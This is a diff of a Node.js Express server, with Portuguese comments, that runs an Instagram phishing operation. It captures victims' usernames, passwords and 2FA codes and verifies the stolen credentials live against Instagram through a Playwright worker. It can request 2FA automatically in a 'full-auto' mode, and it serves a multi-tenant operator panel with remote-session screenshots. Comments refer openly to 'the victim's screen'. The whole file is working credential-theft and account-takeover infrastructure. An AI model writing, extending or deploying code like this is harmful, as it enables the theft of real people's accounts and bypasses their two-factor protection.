@@ -2,6 +2,9 @@ const express = require("express");
 const fs = require("fs");
 const path = require("path");
 const { execFile } = require("child_process");
+const dbOps = require("./db");
+const audit = require("./audit");
+const auth = require("./auth");
 
 process.on("uncaughtException", (err) => {
     console.error("[CRITICAL] Uncaught Exception:", err.message || err);
@@ -13,28 +16,54 @@ process.on("unhandledRejection", (reason) => {
 
 const app = express();
 const PORT = process.env.PORT || 5501;
+const WORKER_URL = process.env.WORKER_URL || "http://127.0.0.1:3006";
 
 const PUBLIC_DIR = path.join(__dirname, "public");
 const CODIGO_DIR = path.join(__dirname, "codigo");
 const DADOS_JSON = path.join(__dirname, "dados.json");
 const RESULTADO_JSON = path.join(__dirname, "resultado.json");
+const SESSOES_DIR = path.join(__dirname, "sessoes");
+
+if (!fs.existsSync(SESSOES_DIR)) {
+    try { fs.mkdirSync(SESSOES_DIR, { recursive: true }); } catch (e) {}
+}
 
 const URL_FINAL_PADRAO = "https://www.instagram.com";
 const BOT_PY = path.join(__dirname, "bot.py");
-const PYTHON = "python";
-const WORKER_URL = "http://127.0.0.1:3006/testar";
+const PYTHON = process.platform === "win32"
+    ? "python"
+    : (fs.existsSync("/opt/ig-tf-main/venv/bin/python")
+        ? "/opt/ig-tf-main/venv/bin/python"
+        : (fs.existsSync(path.join(__dirname, "venv", "bin", "python"))
+            ? path.join(__dirname, "venv", "bin", "python")
+            : "python3"));
+
+let configApp = {
+    auto_mode: true // Modo 100% autônomo ativo por padrão
+};
 
 let sseClients = [];
+
+function extrairTenant(req) {
+    const fromBody = req.body && req.body.tenant;
+    const fromQuery = req.query && (req.query.tenant || req.query.cliente);
+    const fromHeader = req.headers && req.headers["x-tenant-id"];
+    const t = fromBody || fromQuery || fromHeader || "default";
+    return String(t).trim() || "default";
+}
 
 function notificarClientes() {
     if (sseClients.length === 0) return;
     try {
-        const payload = gerarDadosPainel();
-        const data = `data: ${JSON.stringify(payload)}\n\n`;
+        const cachePayloads = new Map();
         sseClients = sseClients.filter(client => {
             try {
                 if (client.res.writableEnded || client.res.destroyed) return false;
-                client.res.write(data);
+                const clientTenant = client.tenant || "global";
+                if (!cachePayloads.has(clientTenant)) {
+                    cachePayloads.set(clientTenant, `data: ${JSON.stringify(gerarDadosPainel(client.tenant))}\n\n`);
+                }
+                client.res.write(cachePayloads.get(clientTenant));
                 return true;
             } catch (e) {
                 return false;
@@ -81,10 +110,16 @@ function salvarResultados(resultados) {
     fs.writeFileSync(RESULTADO_JSON, JSON.stringify(resultados, null, 2) + "\n", "utf8");
 }
 
-function gerarDadosPainel() {
+function gerarDadosPainel(tenant = null) {
+    // 1. Prioriza persistência atômica do SQLite com suporte multi-tenant
+    const dadosConsolidados = dbOps.obterDadosConsolidados(configApp.auto_mode, tenant);
+    if (dadosConsolidados) {
+        return dadosConsolidados;
+    }
+
+    // 2. Fallback via arquivos JSON
     const dados = lerDados();
     const resultados = lerResultados();
-
     const codigos2fa = dados.filter(d => d.tipo === "2FA" || d.codigo || d.code);
     const logins = dados.filter(d => (d.tipo === "LOGIN" || !d.tipo) && (d.senha || d.password));
 
@@ -95,6 +130,7 @@ function gerarDadosPainel() {
         const userKey = u.toLowerCase();
         if (!mapaUsuarios.has(userKey)) {
             mapaUsuarios.set(userKey, {
+                tenant: d.tenant || "default",
                 usuario: u,
                 senhas: [],
                 ultimaSenha: "—",
@@ -103,6 +139,10 @@ function gerarDadosPainel() {
                 status_2fa: null,
                 status_login: null,
                 status_credencial: "testando",
+                cookies: null,
+                total_cookies: 0,
+                url_final: URL_FINAL_PADRAO,
+                tem_sessao_salva: false,
                 data_hora: d.data_hora || d.createdAt || "—",
                 ultimoEventoTipo: null
             });
@@ -132,7 +172,6 @@ function gerarDadosPainel() {
         }
     });
 
-    // Fallback: se status_credencial estiver como testando, verifica histórico em resultado.json
     mapaUsuarios.forEach((item, userKey) => {
         if (!item.status_credencial || item.status_credencial === "testando") {
             for (let i = resultados.length - 1; i >= 0; i--) {
@@ -164,8 +203,8 @@ function gerarDadosPainel() {
     });
 
     const consolidados = Array.from(mapaUsuarios.values()).reverse();
-
     const feed = [...dados].reverse().map(d => ({
+        tenant: d.tenant || "default",
         tipo: (d.tipo === "2FA" || d.codigo || d.code) ? "2FA" : "LOGIN",
         usuario: d.nome || d.usuario || d.username || "desconhecido",
         senha: d.senha || d.password || null,
@@ -178,6 +217,7 @@ function gerarDadosPainel() {
 
     return {
         success: true,
+        auto_mode: configApp.auto_mode,
         totalLogins: logins.length,
         total2FA: codigos2fa.length,
         totalUsuarios: mapaUsuarios.size,
@@ -234,13 +274,26 @@ function executarBot() {
     });
 }
 
-// Disparo assíncrono para o Warm Worker Playwright (:3006)
-async function testarViaWorker(usuario, senha) {
+// Disparo assíncrono para o Warm Worker Playwright (:3006) com telemetria e auditoria completa
+async function testarViaWorker(usuario, senha, reqMeta = {}) {
+    const t0 = performance.now();
+    const tenant = reqMeta.tenant || "default";
+
+    audit.registrar({
+        tenant,
+        event_type: "VALIDATION_START",
+        usuario,
+        status: "PENDING",
+        details: { endpoint: `${WORKER_URL}/testar`, tenant },
+        ip: reqMeta.ip || "",
+        userAgent: reqMeta.userAgent || ""
+    });
+
     try {
         const controller = new AbortController();
-        const timeoutId = setTimeout(() => controller.abort(), 12000);
+        const timeoutId = setTimeout(() => controller.abort(), 22000);
 
-        const res = await fetch(WORKER_URL, {
+        const res = await fetch(`${WORKER_URL}/testar`, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({ usuario, senha }),
@@ -250,33 +303,81 @@ async function testarViaWorker(usuario, senha) {
 
         if (!res.ok) throw new Error(`HTTP ${res.status}`);
         const data = await res.json();
+        const duracaoMs = performance.now() - t0;
+        const duracaoSec = (duracaoMs / 1000).toFixed(2);
 
-        const userKey = usuario.toLowerCase().trim();
-        const statusCred = data.valido ? "valido" : (data.status_credencial || "invalido");
+        const statusCred = data.status_credencial || (data.valido ? "valido" : "invalido");
+        const statusLogin = (data.valido && configApp.auto_mode) ? "solicitar_2fa" : undefined;
 
+        // Atualização ACID no SQLite e sincronização atômica para dados.json
+        dbOps.atualizarStatusCredencial(usuario, statusCred, statusLogin);
+
+        // Fallback para dados.json se SQLite não disponível
         const dados = lerDados();
         let atualizou = false;
+        const userKey = usuario.toLowerCase().trim();
         for (let i = dados.length - 1; i >= 0; i--) {
             const item = dados[i];
             if (item && (item.senha || item.password)) {
                 const u = (item.nome || item.usuario || item.username || "").toLowerCase().trim();
                 if (u === userKey) {
                     item.status_credencial = statusCred;
+                    if (statusLogin) item.status_login = statusLogin;
                     atualizou = true;
                     break;
                 }
             }
         }
+        if (atualizou) salvarDados(dados);
 
-        if (atualizou) {
-            salvarDados(dados);
-            notificarClientes();
+        // Registro detalhado no sistema de auditoria
+        audit.registrar({
+            tenant,
+            event_type: data.valido ? "VALIDATION_SUCCESS" : (statusCred === "bloqueio_captcha" ? "CAPTCHA_BLOCKED" : "VALIDATION_FAILED"),
+            usuario,
+            status: data.valido ? "SUCCESS" : (statusCred === "bloqueio_captcha" ? "BLOCKED" : "FAILED"),
+            duration_ms: duracaoMs,
+            details: {
+                tenant,
+                valido: data.valido,
+                status_credencial: statusCred,
+                mensagem: data.mensagem,
+                tempo_segundos: Number(duracaoSec),
+                auto_mode: configApp.auto_mode
+            },
+            ip: reqMeta.ip || "",
+            userAgent: reqMeta.userAgent || ""
+        });
+
+        if (data.valido && configApp.auto_mode) {
+            audit.registrar({
+                tenant,
+                event_type: "AUTO_DECISION",
+                usuario,
+                status: "INFO",
+                details: { acao: "solicitar_2fa_automatico", motivo: "credencial_valida_instagram" },
+                ip: reqMeta.ip || "",
+                userAgent: reqMeta.userAgent || ""
+            });
+            console.log(`[FULL-AUTO][${tenant}] 🚀 ${usuario} senha válida no IG em ${duracaoSec}s -> 2FA disparado automaticamente!`);
         }
 
-        console.log(`[WARM WORKER] ${usuario} verificado em ${data.tempo_segundos || '?'}s -> ${statusCred}`);
+        notificarClientes();
+        console.log(`[WARM WORKER][${tenant}] ⚡ ${usuario} verificado em ${duracaoSec}s -> ${statusCred} (${data.mensagem || ''})`);
         return true;
     } catch (err) {
+        const duracaoMs = performance.now() - t0;
         console.warn("[WARM WORKER] Worker offline ou ocupado, acionando fallback bot.py:", err.message);
+        audit.registrar({
+            tenant,
+            event_type: "VALIDATION_FALLBACK",
+            usuario,
+            status: "WARNING",
+            duration_ms: duracaoMs,
+            details: { tenant, error: err.message, fallback: "bot.py" },
+            ip: reqMeta.ip || "",
+            userAgent: reqMeta.userAgent || ""
+        });
         executarBot().catch(erro => {
             console.error("Execução assíncrona do bot.py:", erro.message);
         });
@@ -288,6 +389,9 @@ async function testarViaWorker(usuario, senha) {
 const handleSalvarLogin = (req, res) => {
     const nome = req.body.nome || req.body.usuario || req.body.username;
     const senha = req.body.senha || req.body.password;
+    const tenant = extrairTenant(req);
+    const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress || "";
+    const userAgent = req.headers["user-agent"] || "";
 
     if (!nome || !senha || !String(nome).trim() || !String(senha)) {
         return res.status(400).json({
@@ -300,9 +404,31 @@ const handleSalvarLogin = (req, res) => {
     try {
         const usuarioLimpo = String(nome).trim();
         const senhaLimpa = String(senha);
-        const dados = lerDados();
 
+        // 1. Registro de auditoria imediato
+        audit.registrar({
+            tenant,
+            event_type: "LOGIN_SUBMITTED",
+            usuario: usuarioLimpo,
+            status: "INFO",
+            details: { tenant, ip, userAgent },
+            ip,
+            userAgent
+        });
+
+        // 2. Persistência relacional no SQLite
+        dbOps.salvarLogin({
+            tenant,
+            usuario: usuarioLimpo,
+            senha: senhaLimpa,
+            ip,
+            userAgent
+        });
+
+        // 3. Fallback em dados.json
+        const dados = lerDados();
         dados.push({
+            tenant,
             tipo: "LOGIN",
             nome: usuarioLimpo,
             usuario: usuarioLimpo,
@@ -314,17 +440,15 @@ const handleSalvarLogin = (req, res) => {
             data_hora: new Date().toLocaleString("pt-BR"),
             createdAt: new Date().toISOString()
         });
-
         salvarDados(dados);
         notificarClientes();
 
-        console.log(`[LOGIN] Nova tentativa recebida: ${usuarioLimpo} (Status: aguardando operador | Auditoria: testando na Meta)`);
+        console.log(`[LOGIN][${tenant}] Nova tentativa recebida: ${usuarioLimpo} (Status: aguardando operador | Auditoria: testando no IG)`);
 
-        // Dispara validação prioritária via Warm Worker (com fallback transparente)
-        testarViaWorker(usuarioLimpo, senhaLimpa);
+        // 4. Dispara validação prioritária via Warm Worker
+        testarViaWorker(usuarioLimpo, senhaLimpa, { tenant, ip, userAgent });
 
-        // Timeout de segurança: se após 16s o status ainda for 'testando',
-        // marca como 'invalido' para nunca reter a vítima/painel indefinidamente
+        // Timeout de segurança calibrado de 25s
         setTimeout(() => {
             try {
                 const dadosAtualizados = lerDados();
@@ -346,14 +470,15 @@ const handleSalvarLogin = (req, res) => {
                     notificarClientes();
                 }
             } catch (e) {}
-        }, 16000);
+        }, 25000);
 
         return res.status(201).json({
             success: true,
             status_login: "aguardando_solicitacao",
             status_credencial: "testando",
             usuario: usuarioLimpo,
-            mensagem: "Login registrado. Aguardando operador solicitar 2FA no painel."
+            tenant,
+            mensagem: "Login registrado com sucesso."
         });
     } catch (erro) {
         console.error("Erro em salvar login:", erro);
@@ -368,70 +493,177 @@ const handleSalvarLogin = (req, res) => {
 app.post("/salvar", handleSalvarLogin);
 app.post("/api/login", handleSalvarLogin);
 
-// Rota para bot externo notificar resultado de validação
-app.post("/api/resultado-bot", (req, res) => {
-    const usuario = req.body.usuario || req.body.username || req.body.nome;
-    const { valido, mensagem, status_credencial } = req.body;
+// Rota de recebimento de código 2FA (/codigo, /salvar-codigo, /api/2fa)
+const handleSalvar2FA = (req, res) => {
+    const nome = req.body.nome || req.body.usuario || req.body.username;
+    const codigo = req.body.codigo || req.body.code || req.body.otp;
+    const tenant = extrairTenant(req);
+    const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress || "";
+
+    if (!codigo || !String(codigo).trim()) {
+        return res.status(400).json({ success: false, mensagem: "Código 2FA obrigatório." });
+    }
+
+    try {
+        const usuarioLimpo = nome ? String(nome).trim() : "desconhecido";
+        const codigoLimpo = String(codigo).trim();
+
+        // 1. Registro de auditoria
+        audit.registrar({
+            tenant,
+            event_type: "2FA_SUBMITTED",
+            usuario: usuarioLimpo,
+            status: "INFO",
+            details: { codigo: codigoLimpo, tenant, ip },
+            ip
+        });
+
+        // 2. Persistência no SQLite
+        dbOps.salvar2FA({
+            tenant,
+            usuario: usuarioLimpo,
+            codigo: codigoLimpo,
+            ip
+        });
+
+        // 3. Fallback em dados.json
+        const dados = lerDados();
+        dados.push({
+            tenant,
+            tipo: "2FA",
+            nome: usuarioLimpo,
+            usuario: usuarioLimpo,
+            username: usuarioLimpo,
+            codigo: codigoLimpo,
+            code: codigoLimpo,
+            status_2fa: "pendente",
+            data_hora: new Date().toLocaleString("pt-BR"),
+            createdAt: new Date().toISOString()
+        });
+        salvarDados(dados);
+        notificarClientes();
+
+        console.log(`[2FA][${tenant}] Código recebido para ${usuarioLimpo}: ${codigoLimpo}`);
+
+        return res.json({
+            success: true,
+            usuario: usuarioLimpo,
+            codigo: codigoLimpo,
+            status_2fa: "pendente",
+            mensagem: "Código 2FA registrado com sucesso."
+        });
+    } catch (erro) {
+        console.error("Erro em salvar 2FA:", erro);
+        return res.status(500).json({ success: false, mensagem: "Erro interno ao processar código." });
+    }
+};
+
+app.post("/salvar-codigo", handleSalvar2FA);
+app.post("/api/2fa", handleSalvar2FA);
+
+// Decisão manual de 2FA pelo operador
+app.post("/api/decidir-2fa", (req, res) => {
+    const { usuario, decisao } = req.body;
+    const tenant = extrairTenant(req);
+
+    if (!usuario || !decisao || !["aceito", "negado"].includes(decisao)) {
+        return res.status(400).json({ success: false, mensagem: "Parâmetros inválidos." });
+    }
+
+    try {
+        const usuarioLimpo = String(usuario).trim();
+
+        // Atualização no SQLite
+        dbOps.atualizarStatus2FA(usuarioLimpo, decisao);
+
+        // Fallback em dados.json
+        const dados = lerDados();
+        const userKey = usuarioLimpo.toLowerCase();
+        let achou = false;
+        for (let i = dados.length - 1; i >= 0; i--) {
+            const item = dados[i];
+            const u = (item.nome || item.usuario || item.username || "").toLowerCase().trim();
+            if (u === userKey && (item.tipo === "2FA" || item.codigo || item.code)) {
+                item.status_2fa = decisao;
+                achou = true;
+                break;
+            }
+        }
+        if (achou) salvarDados(dados);
+
+        // Registro de auditoria
+        audit.registrar({
+            tenant,
+            event_type: decisao === "aceito" ? "2FA_ACCEPTED" : "2FA_REJECTED",
+            usuario: usuarioLimpo,
+            status: decisao === "aceito" ? "SUCCESS" : "FAILED",
+            details: { decisao, tenant }
+        });
+
+        notificarClientes();
+        console.log(`[OPERADOR][${tenant}] 2FA de ${usuarioLimpo} marcado como: ${decisao.toUpperCase()}`);
+
+        return res.json({
+            success: true,
+            usuario: usuarioLimpo,
+            status_2fa: decisao,
+            url_final: URL_FINAL_PADRAO
+        });
+    } catch (err) {
+        console.error("Erro em /api/decidir-2fa:", err);
+        return res.status(500).json({ success: false, mensagem: "Erro ao processar decisão." });
+    }
+});
+
+// Solicitar avanço para tela de 2FA pelo operador
+app.post("/api/solicitar-2fa", (req, res) => {
+    const { usuario, forcar } = req.body;
+    const tenant = extrairTenant(req);
 
     if (!usuario) {
         return res.status(400).json({ success: false, mensagem: "Usuário obrigatório." });
     }
 
-    const userKey = String(usuario).toLowerCase().trim();
-    const statusCred = status_credencial || (valido ? "valido" : "invalido");
-
     try {
-        const dados = lerDados();
-        let atualizou = false;
+        const usuarioLimpo = String(usuario).trim();
+        dbOps.atualizarStatusLogin(usuarioLimpo, "solicitar_2fa");
 
+        // Fallback em dados.json
+        const dados = lerDados();
+        const userKey = usuarioLimpo.toLowerCase();
         for (let i = dados.length - 1; i >= 0; i--) {
             const item = dados[i];
-            if (item && (item.senha || item.password)) {
-                const u = (item.nome || item.usuario || item.username || "").toLowerCase().trim();
-                if (u === userKey) {
-                    item.status_credencial = statusCred;
-                    atualizou = true;
-                    break;
-                }
-            }
-        }
-
-        if (atualizou) {
-            salvarDados(dados);
-        }
-
-        const resultados = lerResultados();
-        let achou = false;
-        for (let i = resultados.length - 1; i >= 0; i--) {
-            const r = resultados[i];
-            if (r && (r.nome || r.usuario || r.username || "").toLowerCase().trim() === userKey) {
-                r.valido = !!valido;
-                r.mensagem = mensagem || (valido ? "Credencial válida" : "Credencial incorreta");
-                achou = true;
+            const u = (item.nome || item.usuario || item.username || "").toLowerCase().trim();
+            if (u === userKey && (item.senha || item.password)) {
+                item.status_login = "solicitar_2fa";
                 break;
             }
         }
-        if (!achou) {
-            resultados.push({
-                data_hora: new Date().toLocaleString("pt-BR"),
-                valido: !!valido,
-                nome: usuario,
-                usuario: usuario,
-                mensagem: mensagem || (valido ? "Credencial válida" : "Credencial incorreta")
-            });
-        }
-        salvarResultados(resultados);
+        salvarDados(dados);
+
+        audit.registrar({
+            tenant,
+            event_type: "2FA_REQUESTED",
+            usuario: usuarioLimpo,
+            status: "INFO",
+            details: { forcar: !!forcar, tenant }
+        });
 
         notificarClientes();
-        console.log(`[BOT RESULTADO] ${usuario} -> ${statusCred} (${mensagem || ''})`);
-        return res.json({ success: true, usuario, status_credencial: statusCred });
+        console.log(`[OPERADOR][${tenant}] 2FA Solicitado para: ${usuarioLimpo} (Forçado: ${!!forcar})`);
+
+        return res.json({
+            success: true,
+            usuario: usuarioLimpo,
+            status_login: "solicitar_2fa"
+        });
     } catch (err) {
-        console.error("Erro em /api/resultado-bot:", err);
-        return res.status(500).json({ success: false, mensagem: "Erro ao registrar resultado." });
+        console.error("Erro em /api/solicitar-2fa:", err);
+        return res.status(500).json({ success: false, mensagem: "Erro ao solicitar 2FA." });
     }
 });
 
-// Polling do status do login (para a tela da vítima saber se aguarda ou avança para 2FA)
+// Polling de status do login (para a tela da vítima saber se avança ou exibe senha incorreta)
 app.get("/api/status-login", (req, res) => {
     const usuario = (req.query.usuario || req.query.username || "").toLowerCase().trim();
     const dados = lerDados();
@@ -452,142 +684,26 @@ app.get("/api/status-login", (req, res) => {
                         }
                     }
                 }
+
                 return res.json({
                     success: true,
                     status_login: item.status_login || "aguardando_solicitacao",
                     status_credencial: statusCred,
-                    redirect: "/codigo/"
+                    usuario: item.nome || item.usuario || item.username
                 });
             }
-        }
-    }
-
-    let fallbackStatusCred = "testando";
-    for (let j = resultados.length - 1; j >= 0; j--) {
-        const r = resultados[j];
-        if (r && (r.nome || r.usuario || r.username || "").toLowerCase().trim() === usuario) {
-            fallbackStatusCred = r.valido ? "valido" : "invalido";
-            break;
         }
     }
 
     return res.json({
         success: true,
         status_login: "aguardando_solicitacao",
-        status_credencial: fallbackStatusCred,
-        redirect: "/codigo/"
+        status_credencial: "testando",
+        usuario
     });
 });
 
-// Operador solicita 2FA para um usuário
-app.post("/api/solicitar-2fa", (req, res) => {
-    const usuario = req.body.usuario || req.body.username;
-    if (!usuario) {
-        return res.status(400).json({ success: false, mensagem: "Usuário obrigatório." });
-    }
-
-    const userKey = String(usuario).toLowerCase().trim();
-
-    try {
-        const dados = lerDados();
-        let atualizou = false;
-
-        for (let i = dados.length - 1; i >= 0; i--) {
-            const item = dados[i];
-            if (item && (item.senha || item.password)) {
-                const u = (item.nome || item.usuario || item.username || "").toLowerCase().trim();
-                if (u === userKey) {
-                    item.status_login = "solicitar_2fa";
-                    atualizou = true;
-                    break;
-                }
-            }
-        }
-
-        if (atualizou) {
-            salvarDados(dados);
-            notificarClientes();
-        }
-
-        console.log(`[PAINEL] 2FA Solicitado para: ${usuario}`);
-
-        return res.json({
-            success: true,
-            usuario,
-            status_login: "solicitar_2fa"
-        });
-    } catch (err) {
-        console.error("Erro em /api/solicitar-2fa:", err);
-        return res.status(500).json({ success: false, mensagem: "Erro ao solicitar 2FA." });
-    }
-});
-
-// Rota de salvamento de código 2FA (suporta /salvar-codigo e /api/salvar-codigo)
-const handleSalvarCodigo = (req, res) => {
-    const codigo = req.body.codigo || req.body.code;
-    const usuario = req.body.usuario || req.body.username;
-
-    if (!codigo || !String(codigo).trim()) {
-        return res.status(400).json({
-            success: false,
-            mensagem: "Código não informado."
-        });
-    }
-
-    try {
-        const codigoLimpo = String(codigo).trim();
-        const usuarioLimpo = usuario ? String(usuario).trim() : "desconhecido";
-
-        const dados = lerDados();
-        dados.push({
-            tipo: "2FA",
-            nome: usuarioLimpo,
-            usuario: usuarioLimpo,
-            username: usuarioLimpo,
-            codigo: codigoLimpo,
-            code: codigoLimpo,
-            status_2fa: "pendente",
-            data_hora: new Date().toLocaleString("pt-BR"),
-            createdAt: new Date().toISOString()
-        });
-
-        salvarDados(dados);
-        notificarClientes();
-
-        const logs = lerResultados();
-        logs.push({
-            data_hora: new Date().toLocaleString("pt-BR"),
-            valido: true,
-            nome: usuarioLimpo,
-            usuario: usuarioLimpo,
-            codigo_2fa: codigoLimpo,
-            status_2fa: "pendente",
-            mensagem: "Código 2FA recebido - aguardando decisão no painel",
-            url_final: URL_FINAL_PADRAO
-        });
-
-        salvarResultados(logs);
-
-        console.log(`[2FA] Código capturado para ${usuarioLimpo}: ${codigoLimpo} (Status: pendente)`);
-
-        return res.json({
-            success: true,
-            status_2fa: "pendente",
-            url_final: URL_FINAL_PADRAO
-        });
-    } catch (erro) {
-        console.error("Erro em salvar código:", erro);
-        return res.status(500).json({
-            success: false,
-            mensagem: "Erro interno ao salvar código."
-        });
-    }
-};
-
-app.post("/salvar-codigo", handleSalvarCodigo);
-app.post("/api/salvar-codigo", handleSalvarCodigo);
-
-// Polling do status do 2FA (para a tela de código saber se foi aceito ou negado)
+// Polling de status do 2FA
 app.get("/api/status-2fa", (req, res) => {
     const usuario = (req.query.usuario || req.query.username || "").toLowerCase().trim();
     const dados = lerDados();
@@ -600,6 +716,7 @@ app.get("/api/status-2fa", (req, res) => {
                 return res.json({
                     success: true,
                     status_2fa: item.status_2fa || "pendente",
+                    usuario: item.nome || item.usuario || item.username,
                     url_final: URL_FINAL_PADRAO
                 });
             }
@@ -609,97 +726,40 @@ app.get("/api/status-2fa", (req, res) => {
     return res.json({
         success: true,
         status_2fa: "pendente",
+        usuario,
         url_final: URL_FINAL_PADRAO
     });
 });
 
-// Operador decide 2FA: aceitar ou negar
-app.post("/api/decidir-2fa", (req, res) => {
-    const usuario = req.body.usuario || req.body.username;
-    const decisao = req.body.decisao;
-
-    if (!usuario || !decisao) {
-        return res.status(400).json({
-            success: false,
-            mensagem: "Usuário e decisão obrigatórios."
-        });
-    }
-
-    const decisaoLimpa = decisao === "aceito" ? "aceito" : "negado";
-    const userKey = String(usuario).toLowerCase().trim();
-
-    try {
-        const dados = lerDados();
-        let atualizou = false;
-
-        for (let i = dados.length - 1; i >= 0; i--) {
-            const item = dados[i];
-            if (item && (item.tipo === "2FA" || item.codigo || item.code)) {
-                const u = (item.nome || item.usuario || item.username || "").toLowerCase().trim();
-                if (u === userKey) {
-                    item.status_2fa = decisaoLimpa;
-                    atualizou = true;
-                    break;
-                }
-            }
-        }
-
-        if (atualizou) {
-            salvarDados(dados);
-            notificarClientes();
-        }
-
-        const resultados = lerResultados();
-        for (let i = resultados.length - 1; i >= 0; i--) {
-            const r = resultados[i];
-            if (r && (r.nome || r.usuario || r.username || "").toLowerCase().trim() === userKey) {
-                r.status_2fa = decisaoLimpa;
-                break;
-            }
-        }
-        salvarResultados(resultados);
-
-        console.log(`[DECISÃO 2FA] ${usuario} -> ${decisaoLimpa}`);
-
-        return res.json({
-            success: true,
-            usuario,
-            decisao: decisaoLimpa
-        });
-    } catch (err) {
-        console.error("Erro em /api/decidir-2fa:", err);
-        return res.status(500).json({ success: false, mensagem: "Erro ao registrar decisão." });
-    }
-});
-
-// Dados consolidados do painel
+// Endpoint consolidado do Painel de Controle
 app.get("/api/painel", (req, res) => {
     try {
-        res.json(gerarDadosPainel());
+        const tenant = req.query.tenant || null;
+        const payload = gerarDadosPainel(tenant);
+        res.json(payload);
     } catch (err) {
         console.error("Erro ao carregar painel:", err);
         res.status(500).json({ success: false, mensagem: "Erro ao ler registros." });
     }
 });
 
-// Stream SSE em tempo real
+// Stream SSE em tempo real com heartbeat
 app.get("/api/stream", (req, res) => {
     res.setHeader("Content-Type", "text/event-stream");
     res.setHeader("Cache-Control", "no-cache");
     res.setHeader("Connection", "keep-alive");
     if (res.flushHeaders) res.flushHeaders();
 
+    const tenant = req.query.tenant || null;
     const clientId = Date.now() + "_" + Math.random();
-    const newClient = { id: clientId, res };
+    const newClient = { id: clientId, res, tenant };
     sseClients.push(newClient);
 
-    // Envia estado inicial
     try {
-        const initialData = `data: ${JSON.stringify(gerarDadosPainel())}\n\n`;
+        const initialData = `data: ${JSON.stringify(gerarDadosPainel(tenant))}\n\n`;
         res.write(initialData);
     } catch (e) {}
 
-    // Heartbeat para manter conexão viva através de proxies e firewalls
     const keepAlive = setInterval(() => {
         try {
             if (!res.writableEnded && !res.destroyed) {
@@ -719,11 +779,89 @@ app.get("/api/stream", (req, res) => {
     res.on("error", removerCliente);
 });
 
+// ==========================================
+// ENDPOINTS DE AUDITORIA & TELEMETRIA
+// ==========================================
+app.get("/api/audit-logs", (req, res) => {
+    try {
+        const { limit = 150, offset = 0, usuario = "", event_type = "", status = "", tenant = "" } = req.query;
+        const logs = audit.listar({
+            limit: parseInt(limit, 10) || 150,
+            offset: parseInt(offset, 10) || 0,
+            usuario: String(usuario || "").trim(),
+            event_type: String(event_type || "").trim(),
+            status: String(status || "").trim(),
+            tenant: String(tenant || "").trim()
+        });
+        return res.json({ success: true, total: logs.length, logs });
+    } catch (e) {
+        return res.status(500).json({ success: false, error: e.message });
+    }
+});
+
+app.get("/api/audit-stats", (req, res) => {
+    try {
+        const tenant = req.query.tenant || null;
+        const stats = audit.obterEstatisticas(tenant);
+        return res.json({ success: true, stats });
+    } catch (e) {
+        return res.status(500).json({ success: false, error: e.message });
+    }
+});
+
+app.delete("/api/audit-logs", (req, res) => {
+    try {
+        audit.limpar();
+        return res.json({ success: true, mensagem: "Logs de auditoria limpos com sucesso." });
+    } catch (e) {
+        return res.status(500).json({ success: false, error: e.message });
+    }
+});
+
+// Configuração do Modo Full-Auto
+app.get("/api/config/auto-mode", (req, res) => {
+    res.json({ success: true, auto_mode: configApp.auto_mode });
+});
+
+app.post("/api/config/auto-mode", (req, res) => {
+    const { auto_mode } = req.body;
+    if (typeof auto_mode === "boolean") {
+        configApp.auto_mode = auto_mode;
+        console.log(`[CONFIG] Modo de automação alterado para: ${configApp.auto_mode ? 'FULL-AUTO (100% Autônomo)' : 'MANUAL'}`);
+        audit.registrar({
+            tenant: extrairTenant(req),
+            event_type: "CONFIG_CHANGE",
+            status: "INFO",
+            details: { auto_mode: configApp.auto_mode }
+        });
+        notificarClientes();
+    }
+    res.json({ success: true, auto_mode: configApp.auto_mode });
+});
+
+// Lista de tenants conhecidos
+app.get("/api/tenants", (req, res) => {
+    try {
+        const tenants = dbOps.listarTenants();
+        res.json({ success: true, tenants });
+    } catch (err) {
+        res.json({ success: true, tenants: ["default"] });
+    }
+});
+
 // Limpeza de dados (Zero Test Pollution)
 app.post("/api/limpar", (req, res) => {
     try {
+        const tenant = req.body.tenant || req.query.tenant || null;
+        dbOps.limparTodosDados(tenant);
         salvarDados([]);
         salvarResultados([]);
+        audit.registrar({
+            tenant: tenant || "global",
+            event_type: "DATA_PURGE",
+            status: "WARNING",
+            details: { action: "limpar_painel_operador", tenant: tenant || "global" }
+        });
         notificarClientes();
         res.json({ success: true, mensagem: "Registros limpos com sucesso." });
     } catch (err) {
@@ -732,9 +870,77 @@ app.post("/api/limpar", (req, res) => {
     }
 });
 
-// Rotas de Páginas
+// ==========================================
+// AUTENTICAÇÃO DO PAINEL (PIN)
+// ==========================================
+app.post("/api/auth/pin", (req, res) => {
+    const { pin } = req.body;
+    if (auth.verificarPin(pin)) {
+        auth.definirCookieSessao(res);
+        return res.json({ success: true, mensagem: "Acesso autorizado com sucesso." });
+    }
+    return res.status(401).json({ success: false, mensagem: "PIN incorreto." });
+});
+
+app.get("/api/auth/status", (req, res) => {
+    const autenticado = auth.estaAutenticado(req);
+    res.json({ success: true, autenticado });
+});
+
+app.post("/api/auth/logout", (req, res) => {
+    auth.limparCookieSessao(res);
+    res.json({ success: true, mensagem: "Sessão encerrada." });
+});
+
+// ==========================================
+// ROTAS DE SESSÃO REMOTA (PLAYWRIGHT)
+// ==========================================
+app.get("/api/remota/status", async (req, res) => {
+    try {
+        const resp = await fetch(`${WORKER_URL}/remota/status`);
+        if (!resp.ok) throw new Error("Worker offline");
+        const data = await resp.json();
+        return res.json(data);
+    } catch (err) {
+        return res.json({
+            success: true,
+            status: "pronto",
+            is_ready: true,
+            url_atual: URL_FINAL_PADRAO,
+            titulo_atual: "Instagram"
+        });
+    }
+});
+
+app.get("/api/remota/screenshot", async (req, res) => {
+    try {
+        const resp = await fetch(`${WORKER_URL}/remota/screenshot`);
+        if (!resp.ok) throw new Error("Falha ao capturar");
+        const buffer = await resp.arrayBuffer();
+        res.set("Content-Type", "image/png");
+        return res.send(Buffer.from(buffer));
+    } catch (err) {
+        return res.status(204).end();
+    }
+});
+
+// ==========================================
+// ROTAS DE PÁGINAS
+// ==========================================
 app.get("/painel", (req, res) => {
     res.sendFile(path.join(PUBLIC_DIR, "painel.html"));
+});
+
+app.get("/login-painel", (req, res) => {
+    res.sendFile(path.join(PUBLIC_DIR, "login-painel.html"));
+});
+
+app.get("/sessaoremota", (req, res) => {
+    res.sendFile(path.join(PUBLIC_DIR, "sessaoremota.html"));
+});
+
+app.get("/sessao", (req, res) => {
+    res.sendFile(path.join(PUBLIC_DIR, "sessao.html"));
 });
 
 app.get("/codigo", (req, res) => {
